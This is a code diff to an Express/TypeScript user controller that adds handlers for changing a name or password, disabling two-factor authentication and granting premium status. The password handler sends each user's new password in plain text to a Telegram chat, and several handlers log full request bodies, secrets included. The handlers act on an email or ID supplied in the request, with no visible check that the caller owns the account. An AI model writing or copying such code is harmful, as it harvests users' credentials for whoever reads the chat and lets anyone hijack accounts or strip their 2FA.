@@ -40,6 +40,8 @@ class UserController {
     try {
       // get accoutn personal info
       const { id, email, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName } = req.body
+      console.log('req body: ', req.body);
+
       const user: any = await UserServices.personalAreaProfile(id)
       console.log('found user is: ', user)
       if (user) {
@@ -60,6 +62,35 @@ class UserController {
     }
   }
 
+  async personalAreaProfileEdit(req: express.Request, res: express.Response, next: express.NextFunction) {
+    try {
+      const { userId, userName, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction, } = req.body
+      console.log('req body: ', req.body);
+
+      if (!userName && !userId) {
+        return res.json({
+          message: 'wrong data',
+          status: 'rejected'
+        })
+      }
+      const result: boolean = await UserServices.changeNameInProfile(userId, userName)
+      if (result === true) {
+        await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName)
+        await telegram.sendMessageByUserActions(userEmail, `поменял имя на ${userName}`, domainName)
+        return res.json({
+          message: 'name was changed',
+          status: 'complete'
+        })
+      }
+      return res.json({
+        message: 'error',
+        status: 'rejected'
+      })
+    } catch (e) {
+      next(e)
+    }
+  }
+
   async personalAreaSecurity(req: express.Request, res: express.Response, next: express.NextFunction) {
     try {
       // get accoutn security (2fa, login history)
@@ -72,15 +103,76 @@ class UserController {
   async personalAreaSecurityChangePassword(req: express.Request, res: express.Response, next: express.NextFunction) {
     try {
       // get accoutn security (2fa, login history)
-
-      const result: any = await UserServices.personalAreaChangePassword(req.body.id, req.body.newPassword)
-      if (result === true) {
+      const { id, newPassword, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction, } = req.body
+      const result: any = await UserServices.personalAreaChangePassword(userEmail, newPassword)
+      if (result === false) {
         console.log('operation status: ', result)
-        return res.json({ status: 'complete' })
+        return res.json({
+          message: 'password doesn`t change',
+          status: 'rejected'
+        })
       }
+      await saveUserLogs(id, userEmail, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName)
+      await telegram.sendMessageByUserActions(userEmail, `поменял пароль на  ${newPassword}`, domainName)
       console.log('operation status: ', result)
-      return res.json({ status: 'rejected' })
+      return res.json({
+        message: 'password was change',
+        status: 'complete'
+      })
 
+
+    } catch (e) {
+      next(e)
+    }
+  }
+
+  async disableTwoStepVerificationStatus(req: express.Request, res: express.Response, next: express.NextFunction) {
+    try {
+      const { userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName } = req.body
+      console.log('req body: ', req.body);
+
+      const result: boolean = await UserServices.disableUserTwoStep(userId)
+      if (result === false) {
+        console.log('error');
+        return res.json({
+          message: 'error',
+          status: 'rejected'
+        })
+      }
+
+      await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName)
+      await telegram.sendMessageByUserActions(userEmail, `выключил 2фа аутентификацию`, domainName)
+      return res.json({
+        message: '2fa turned off',
+        status: 'complete'
+      })
+
+
+    } catch (e) {
+      next(e)
+    }
+  }
+
+  async updatePremiumStatus(req: express.Request, res: express.Response, next: express.NextFunction) {
+    try {
+      const { userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName } = req.body
+      console.log('req body: ', req.body);
+
+      const result: boolean = await UserServices.enablePremiumStatus(userId)
+      if (result === false) {
+        console.log('error');
+        return res.json({
+          message: 'error',
+          status: 'rejected'
+        })
+      }
+
+      await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName)
+      await telegram.sendMessageByUserActions(userEmail, `получил премиум статус`, domainName)
+      return res.json({
+        message: 'premium status was update',
+        status: 'complete'
+      })
     } catch (e) {
       next(e)
     }
@@ -151,7 +243,7 @@ class UserController {
   // }
 
 
-  async getUserLogs() {
+  async getUserLogsToProfile() {
     try {
 
       // chat with support
